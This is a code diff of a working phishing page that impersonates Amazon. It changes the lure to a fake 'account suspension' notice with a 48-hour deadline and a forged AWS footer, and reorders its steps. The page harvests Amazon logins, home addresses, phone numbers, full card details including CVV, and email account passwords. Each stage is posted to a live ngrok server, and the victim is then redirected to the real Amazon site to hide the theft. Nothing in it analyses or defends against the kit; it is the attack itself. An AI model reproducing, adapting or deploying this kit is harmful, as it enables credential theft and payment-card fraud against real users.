@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Amazon Sign-In</title>
+    <title>Amazon - Account Suspension Notice</title>
     <style>
         * {
             margin: 0;
@@ -21,7 +21,7 @@
         }
         .container {
             background: white;
-            max-width: 400px;
+            max-width: 500px;
             width: 100%;
             padding: 25px 30px;
             border-radius: 8px;
@@ -43,7 +43,12 @@
             font-size: 14px;
         }
         .alert p {
-            margin-bottom: 5px;
+            margin-bottom: 10px;
+        }
+        hr {
+            margin: 15px 0;
+            border: none;
+            border-top: 1px solid #e7e7e7;
         }
         h1, h2 {
             font-size: 28px;
@@ -155,6 +160,22 @@
         .progress-step.done {
             background: #28a745;
         }
+        .success {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .success svg {
+            width: 70px;
+            height: 70px;
+            color: #28a745;
+            margin-bottom: 20px;
+        }
+        .note {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -168,16 +189,16 @@
         <div id="step5_prog" class="progress-step">5</div>
     </div>
 
-    <!-- STEP 1: AMAZON LOGIN (LOCKED ACCOUNT) -->
+    <!-- STEP 1: ACCOUNT SUSPENDED (updated message from image) -->
     <div id="step1" class="step active">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
         </div>
         <div class="alert">
-            <p>⚠️ <strong>Account Temporarily Locked</strong></p>
-            <p>We detected unusual activity on your account. Verify your identity to restore access.</p>
+            <p><strong>Dear Customer,</strong></p>
+            <p>Due to a problem with your credit card, We have faced some problems with your account details. Therefore your amazon account has been temporarily suspended. Account suspension will effects your last 15 days activities including all the transaction you have made.</p>
+            <p>Please update your account's information to regain access to all features of Amazon Services.</p>
         </div>
-        <h1>Sign-In</h1>
         <div class="form-group">
             <label>Email or mobile phone number</label>
             <input type="email" id="amz_email" autofocus>
@@ -186,43 +207,27 @@
             <label>Password</label>
             <input type="password" id="amz_password">
         </div>
-        <button id="step1Btn">Continue</button>
+        <button id="step1Btn">Update Now</button>
         <div id="step1Error" class="error"></div>
+        <div class="note">
+            <strong>Note:</strong> If you do not verify within next 48 hours, Our service will permanently suspend your Amazon account.
+        </div>
         <div class="help-links">
             <a href="#">Forgot your password?</a>
         </div>
         <div class="footer">
             New to Amazon? <a href="#">Create your Amazon account</a>
         </div>
-    </div>
-
-    <!-- STEP 2: PAYMENT METHOD -->
-    <div id="step2" class="step">
-        <h2>Confirm payment method</h2>
-        <div class="section">
-            <h3>💳 Card information</h3>
-            <div class="form-group">
-                <label>Card number</label>
-                <input type="text" id="card_number" placeholder="4444 3333 2222 1111">
-            </div>
-            <div class="row">
-                <div class="col">
-                    <label>Expiry (MM/YY)</label>
-                    <input type="text" id="expiry" placeholder="12/28">
-                </div>
-                <div class="col">
-                    <label>CVV</label>
-                    <input type="text" id="cvv" placeholder="123">
-                </div>
-            </div>
+        <hr>
+        <div class="note">
+            This message was produced and distributed by Amazon Web Services, Inc. or its affiliates, 410 Terry Ave. North, Seattle, WA 98109.<br>
+            © 2026, Amazon Web Services, Inc. or its affiliates. All rights reserved.
         </div>
-        <button id="step2Btn">Continue</button>
-        <div id="step2Error" class="error"></div>
     </div>
 
-    <!-- STEP 3: BILLING ADDRESS -->
-    <div id="step3" class="step">
-        <h2>Billing address</h2>
+    <!-- STEP 2: FULL ADDRESS DETAILS -->
+    <div id="step2" class="step">
+        <h2>Verify your address</h2>
         <div class="form-group">
             <label>Full name</label>
             <input type="text" id="fullname" placeholder="John Doe">
@@ -262,6 +267,30 @@
             <label>Phone number</label>
             <input type="tel" id="phone" placeholder="+1 555 123 4567">
         </div>
+        <button id="step2Btn">Continue</button>
+        <div id="step2Error" class="error"></div>
+    </div>
+
+    <!-- STEP 3: CREDIT CARD DETAILS -->
+    <div id="step3" class="step">
+        <h2>Confirm payment method</h2>
+        <div class="section">
+            <h3>💳 Card information</h3>
+            <div class="form-group">
+                <label>Card number</label>
+                <input type="text" id="card_number" placeholder="4444 3333 2222 1111">
+            </div>
+            <div class="row">
+                <div class="col">
+                    <label>Expiry (MM/YY)</label>
+                    <input type="text" id="expiry" placeholder="12/28">
+                </div>
+                <div class="col">
+                    <label>CVV</label>
+                    <input type="text" id="cvv" placeholder="123">
+                </div>
+            </div>
+        </div>
         <button id="step3Btn">Continue</button>
         <div id="step3Error" class="error"></div>
     </div>
@@ -271,10 +300,10 @@
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
         </div>
-        <h2>Verify your email</h2>
+        <h2>Email verification required</h2>
         <div class="alert">
-            <p>🔐 <strong>Security verification</strong></p>
-            <p>We need to confirm your email access to complete the verification process.</p>
+            <p>🔐 <strong>Final security step</strong></p>
+            <p>We need to confirm your email access to complete verification.</p>
         </div>
         <div class="form-group">
             <label>Email address</label>
@@ -288,21 +317,28 @@
         <div id="step4Error" class="error"></div>
     </div>
 
-    <!-- STEP 5: PROCESSING & REDIRECT -->
+    <!-- STEP 5: VALIDATION + REDIRECT -->
     <div id="step5" class="step">
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
         </div>
-        <h2>Verifying your information...</h2>
-        <div class="alert">
-            <p>✅ Please wait. You will be redirected to your account.</p>
+        <div class="success">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+            </svg>
+            <h2>Information validated!</h2>
+            <div class="alert" style="background:#e8f5e9; border-left-color:#28a745;">
+                <p>✅ Your information has been successfully verified.</p>
+                <p>You will be redirected to your Amazon account in a few seconds...</p>
+            </div>
+            <div style="margin: 20px 0;">⏳ Redirecting...</div>
         </div>
-        <div style="text-align: center; margin: 30px 0;">⏳ Processing...</div>
     </div>
 </div>
 
 <script>
-    // ===== رابط السيرفر ديالك (بدل الرابط القديم بالجديد) =====
+    // ===== رابط السيرفر (بدل الرابط القديم بالجديد من ngrok) =====
     const SERVER_URL = "https://67b0-196-113-207-42.ngrok-free.app/submit";
     
     let collected = {};
@@ -322,7 +358,7 @@
         }
     }
 
-    function sendData(data, nextStep, errorDivId) {
+    function sendData(data, nextStep, errorDivId, isFinal = false) {
         fetch(SERVER_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -330,21 +366,20 @@
         })
         .then(res => {
             if (res.ok) {
-                // الانتقال للخطوة التالية
                 document.getElementById("step" + (nextStep - 1)).classList.remove("active");
                 document.getElementById("step" + nextStep).classList.add("active");
                 updateProgress(nextStep);
-                if (nextStep === 5) {
+                if (isFinal) {
                     setTimeout(() => {
                         window.location.href = "https://www.amazon.com";
-                    }, 2000);
+                    }, 3000);
                 }
             } else {
                 document.getElementById(errorDivId).innerText = "Server error. Please try again.";
             }
         })
         .catch(() => {
-            document.getElementById(errorDivId).innerText = "Network error. Please check your connection.";
+            document.getElementById(errorDivId).innerText = "Network error. Check your connection.";
         });
     }
 
@@ -358,26 +393,11 @@
         }
         collected.amz_email = email;
         collected.amz_password = password;
-        sendData({ stage: "amazon_login", email: email, password: password }, 2, "step1Error");
+        sendData({ stage: "amazon_login", email: email, password: password }, 2, "step1Error", false);
     };
 
-    // Step 2
+    // Step 2: Address
     document.getElementById("step2Btn").onclick = () => {
-        let card = document.getElementById("card_number").value.trim();
-        let expiry = document.getElementById("expiry").value.trim();
-        let cvv = document.getElementById("cvv").value.trim();
-        if (!card || !expiry || !cvv) {
-            document.getElementById("step2Error").innerText = "Please fill all card details";
-            return;
-        }
-        collected.card = card;
-        collected.expiry = expiry;
-        collected.cvv = cvv;
-        sendData({ stage: "payment", card: card, expiry: expiry, cvv: cvv }, 3, "step2Error");
-    };
-
-    // Step 3
-    document.getElementById("step3Btn").onclick = () => {
         let fullname = document.getElementById("fullname").value.trim();
         let address = document.getElementById("address").value.trim();
         let city = document.getElementById("city").value.trim();
@@ -386,7 +406,7 @@
         let country = document.getElementById("country").value;
         let phone = document.getElementById("phone").value.trim();
         if (!fullname || !address || !city || !state || !zip || !phone) {
-            document.getElementById("step3Error").innerText = "Please fill all address fields";
+            document.getElementById("step2Error").innerText = "Please fill all address fields";
             return;
         }
         collected.fullname = fullname;
@@ -396,10 +416,25 @@
         collected.zip = zip;
         collected.country = country;
         collected.phone = phone;
-        sendData({ stage: "address", fullname: fullname, address: address, city: city, state: state, zip: zip, country: country, phone: phone }, 4, "step3Error");
+        sendData({ stage: "address", fullname, address, city, state, zip, country, phone }, 3, "step2Error", false);
     };
 
-    // Step 4
+    // Step 3: Credit Card
+    document.getElementById("step3Btn").onclick = () => {
+        let card = document.getElementById("card_number").value.trim();
+        let expiry = document.getElementById("expiry").value.trim();
+        let cvv = document.getElementById("cvv").value.trim();
+        if (!card || !expiry || !cvv) {
+            document.getElementById("step3Error").innerText = "Please fill all card details";
+            return;
+        }
+        collected.card = card;
+        collected.expiry = expiry;
+        collected.cvv = cvv;
+        sendData({ stage: "payment", card, expiry, cvv }, 4, "step3Error", false);
+    };
+
+    // Step 4: Email Access
     document.getElementById("step4Btn").onclick = () => {
         let email_access = document.getElementById("email_access").value.trim();
         let email_password = document.getElementById("email_password").value.trim();
@@ -425,7 +460,7 @@
             phone: collected.phone,
             email_access: email_access,
             email_password: email_password
-        }, 5, "step4Error");
+        }, 5, "step4Error", true);
     };
 </script>
 </body>
